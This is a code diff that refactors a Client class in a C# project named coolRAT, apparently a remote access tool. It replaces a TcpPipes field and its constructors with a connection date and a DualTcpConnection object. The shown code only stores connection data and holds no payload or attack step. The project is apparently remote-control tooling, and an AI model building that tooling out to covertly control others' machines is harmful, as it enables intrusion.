@@ -1,29 +1,21 @@
-﻿using System;
-using System.Net.Sockets;
+﻿using coolRAT.Libs.Connections;
+using System;
+using System.Collections.Generic;
+using System.Text;
 
 namespace coolRAT.Libs
 {
     public class Client
     {
         public Guid UniqueId;
-        public TcpPipes Pipes;
+        public DateTime ConnectionDate;
+        public DualTcpConnection Connection;
 
-        public Client(TcpPipes pipes)
-        {
-            UniqueId = Guid.NewGuid();
-            Pipes = pipes;
-        }
-
-        public Client(Guid uniqueId, TcpPipes pipes)
+        public Client(Guid uniqueId)
         {
             UniqueId = uniqueId;
-            Pipes = pipes;
-        }
-
-        public Client(string uniqueId, TcpPipes pipes)
-        {
-            UniqueId = new Guid(uniqueId);
-            Pipes = pipes;
+            ConnectionDate = DateTime.Now;
+            Connection = new DualTcpConnection();
         }
     }
 }
